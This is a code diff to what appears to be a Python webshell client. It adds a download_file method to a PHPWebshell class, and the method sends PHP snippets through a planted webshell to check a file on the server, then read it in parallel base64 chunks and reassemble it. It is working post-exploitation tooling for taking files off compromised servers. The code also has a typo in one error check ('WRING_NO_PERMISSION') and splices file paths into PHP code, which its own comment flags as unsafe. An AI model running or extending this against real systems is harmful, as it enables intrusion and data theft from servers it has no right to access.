@@ -332,6 +332,9 @@ php_webshell_conn_options = [
     ),
 ]
 
+# TODO: fix string repr, php will parse `$` in quoted strings
+# TODO: make code smaller by removing newlines, spaces and tabs
+
 
 class PHPWebshell(PHPSessionInterface):
     """PHP session各类工具函数的实现"""
@@ -343,7 +346,7 @@ class PHPWebshell(PHPSessionInterface):
         self.encoder = options.get("encoder", "raw")
         self.decoder = options.get("decoder", "raw")
         self.sessionize_payload = options.get("sessionize_payload", False)
-        # for upload file
+        # for upload file and download file
         self.chunk_size = 32 * 1024
         self.max_coro = 4
 
@@ -517,6 +520,99 @@ class PHPWebshell(PHPSessionInterface):
         if result == "WRONG_READ_ERROR":
             raise exceptions.FileError("无法读取上传的暂存文件，难道是被删了？")
         return result == "DONE"
+
+    async def download_file(
+        self, filepath: str, callback: t.Union[t.Callable, None] = None
+    ) -> bytes:
+
+        filesize_text = await self.submit(
+            """
+            if(!is_file(FILEPATH)) {
+                decoder_echo("WRONG_NOT_FILE");
+            } else if(!is_readable(FILEPATH)) {
+                decoder_echo("WRONG_NO_PERMISSION");
+            } else {
+                decoder_echo(json_encode(filesize(FILEPATH)));
+            }
+            """.replace(
+                "FILEPATH", repr(filepath)
+            )
+        )
+        if filesize_text == "WRONG_NOT_FILE":
+            raise exceptions.FileError("没有这个文件")
+        if filesize_text == "WRING_NO_PERMISSION":
+            raise exceptions.FileError("没有权限读取这个文件")
+
+        try:
+            filesize = json.loads(filesize_text)
+        except json.decoder.JSONDecodeError as exc:
+            raise exceptions.UnknownError(
+                "获取文件大小失败，打印的文件大小不是一个数字: " + repr(filesize_text)
+            ) from exc
+
+        if filesize is False:
+            raise exceptions.UnknownError(
+                "虽然文件存在且可以读取，但获取文件大小仍然失败"
+            )
+        if not isinstance(filesize, int):
+            raise exceptions.UnknownError("获取文件大小失败，文件大小不是一个整数")
+
+        sem = asyncio.Semaphore(self.max_coro)
+        chunk_size = self.chunk_size
+        done_count = 0
+        coros = []
+
+        async def download_chunk(offset: int):
+            nonlocal done_count, coros
+            code = (
+                """
+            $file = fopen(FILEPATH, "rb");
+            if(!is_file(FILEPATH)) {
+                decoder_echo("WRONG_NOT_FILE");
+            } else if(!is_readable(FILEPATH)) {
+                decoder_echo("WRONG_NO_PERMISSION");
+            } else if(!$file) {
+                decoder_echo("WRONG_UNKNOWN");
+            }else{
+                fseek($file, OFFSET);
+                $content = fread($file, CHUNK_SIZE);
+                fclose($file);
+                decoder_echo(base64_encode($content));
+            }
+
+            """.replace(
+                    "    ", ""
+                )
+                .replace("FILEPATH", repr(filepath))
+                .replace("OFFSET", str(offset))
+                .replace("CHUNK_SIZE", str(chunk_size))
+            )
+            async with sem:
+                await asyncio.sleep(0.01)  # we don't ddos
+                result = await self.submit(code)
+                done_count += 1
+                if callback:
+                    callback(done_count / len(coros))
+            return result
+
+        coros = [download_chunk(i) for i in range(0, filesize, chunk_size)]
+        chunks = await asyncio.gather(*coros)
+        result = b""
+        for chunk in chunks:
+            if chunk == "WRONG_NOT_FILE":
+                raise exceptions.FileError("文件不存在或者不是一个普通文件")
+            elif chunk == "WRONG_NO_PERMISSION":
+                raise exceptions.FileError("没有读取权限")
+            elif chunk == "WRONG_UNKNOWN":
+                raise exceptions.UnknownError("未知错误，下载文件失败")
+            try:
+                result += base64.b64decode(chunk)
+            except Exception as exc:
+                raise exceptions.UnknownError(
+                    "读取文件失败，webshell返回的不是正确的base64"
+                ) from exc
+
+        return result
 
     async def get_pwd(self) -> str:
         return await self.submit("decoder_echo(__DIR__);")
